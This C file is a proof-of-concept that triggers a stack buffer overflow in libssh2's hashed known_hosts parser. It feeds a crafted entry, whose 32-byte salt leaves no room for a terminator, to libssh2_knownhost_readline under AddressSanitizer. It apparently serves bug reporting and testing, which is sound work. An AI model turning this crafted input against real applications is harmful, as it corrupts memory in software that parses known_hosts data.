/* PoC: stack-buffer-overflow while parsing a hashed known_hosts entry.
 *
 * Drives the public libssh2 API end to end: a session is created and a single
 * crafted known_hosts line is handed to libssh2_knownhost_readline(), exactly
 * as an application would when loading a known_hosts file.  The only thing that
 * differs from an ordinary valid hashed entry is the length of the base64 salt
 * between the "|1|" marker and the following "|" separator.
 *
 * Build (against an ASan-instrumented libssh2):
 *   cc -fsanitize=address -g -I include pocs/residual.c \
 *      build-asan/src/libssh2.a -lssl -lcrypto -lz -o /tmp/residual
 * Run:
 *   /tmp/residual
 */

#include <stdio.h>
#include <string.h>

#include "libssh2.h"

/* A hashed entry is "|1|<base64 salt>|<base64 hash> <keytype> <base64 key>".
   The salt here is 32 bytes long, which fills the parser's 32-byte salt
   buffer and leaves no room for its NUL terminator. */
static const char line[] =
    "|1|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|"
    "abcdefghijklmnopqrstuvwxyz0= "
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleExampleExampleExampleExampl";

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 1;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 1;
    }

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    fprintf(stderr, "readline returned %d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
